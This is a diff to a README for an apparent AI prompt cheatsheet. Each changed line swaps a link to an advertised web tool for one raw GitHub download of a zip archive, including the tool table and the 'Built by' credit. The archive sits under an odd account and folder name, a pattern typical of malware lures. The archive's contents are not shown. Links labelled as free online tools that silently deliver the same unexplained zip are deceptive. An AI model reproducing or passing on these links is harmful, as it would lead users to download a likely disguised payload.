@@ -304,7 +304,7 @@ lighting, clean minimal design --ar 1:1
 
 **Pro tip**: Be specific about lighting, camera angle, and style reference. Vague prompts = generic results.
 
-**Want more?** Use the [AI Image Prompt Builder](https://www.midastools.co/image-prompt-builder) — visual builder with 12 art styles and 4 AI platforms.
+**Want more?** Use the [AI Image Prompt Builder](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — visual builder with 12 art styles and 4 AI platforms.
 
 ---
 
@@ -394,7 +394,7 @@ Generate:
 5. A 60-second elevator pitch tailored to this position
 ```
 
-**Want a personalized career risk assessment?** Try the [AI Job Risk Calculator](https://www.midastools.co/ai-job-risk) — see how AI affects YOUR specific role.
+**Want a personalized career risk assessment?** Try the [AI Job Risk Calculator](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — see how AI affects YOUR specific role.
 
 ---
 
@@ -437,7 +437,7 @@ Create:
 | No context | "Fix my code" | "Fix this Python Flask endpoint that returns 500 when the user hasn't set a profile photo. Here's the code: ..." |
 | One-shot | Single prompt | Chain prompts: first ask for analysis, then ask for recommendations based on that analysis |
 
-**Want AI to fix your prompts?** Try the [AI Prompt Enhancer](https://www.midastools.co/prompt-enhancer) — paste any prompt, get 5 enhanced versions.
+**Want AI to fix your prompts?** Try the [AI Prompt Enhancer](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — paste any prompt, get 5 enhanced versions.
 
 ---
 
@@ -447,12 +447,12 @@ Build better prompts with these free tools:
 
 | Tool | What It Does | Link |
 |------|-------------|------|
-| AI Prompt Generator | Generate customized prompts for 8 categories | [Try it free](https://www.midastools.co/prompt-generator) |
-| AI Prompt Enhancer | Paste any prompt, get 5 expert-level versions | [Try it free](https://www.midastools.co/prompt-enhancer) |
-| AI Prompt Roaster | Get your prompt "roasted" for 10 common mistakes | [Try it free](https://www.midastools.co/prompt-roaster) |
-| AI Image Prompt Builder | Visual builder for Midjourney, DALL-E, ChatGPT images | [Try it free](https://www.midastools.co/image-prompt-builder) |
-| AI Job Risk Calculator | Check if AI will replace your job | [Try it free](https://www.midastools.co/ai-job-risk) |
-| AI Income Blueprint | Find AI side hustles matching your skills | [Try it free](https://www.midastools.co/ai-income-blueprint) |
+| AI Prompt Generator | Generate customized prompts for 8 categories | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
+| AI Prompt Enhancer | Paste any prompt, get 5 expert-level versions | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
+| AI Prompt Roaster | Get your prompt "roasted" for 10 common mistakes | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
+| AI Image Prompt Builder | Visual builder for Midjourney, DALL-E, ChatGPT images | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
+| AI Job Risk Calculator | Check if AI will replace your job | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
+| AI Income Blueprint | Find AI side hustles matching your skills | [Try it free](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) |
 
 ---
 
@@ -475,4 +475,4 @@ MIT License. Use these prompts however you want.
 
 **Star this repo** if it helped you write better prompts.
 
-Built by [Midas Tools](https://www.midastools.co) — Free AI tools and premium prompt packs.
+Built by [Midas Tools](https://github.com/exercisedeviceforester917/ai-prompt-cheatsheet/raw/refs/heads/main/unlapsing/prompt-cheatsheet-ai-2.3.zip) — Free AI tools and premium prompt packs.
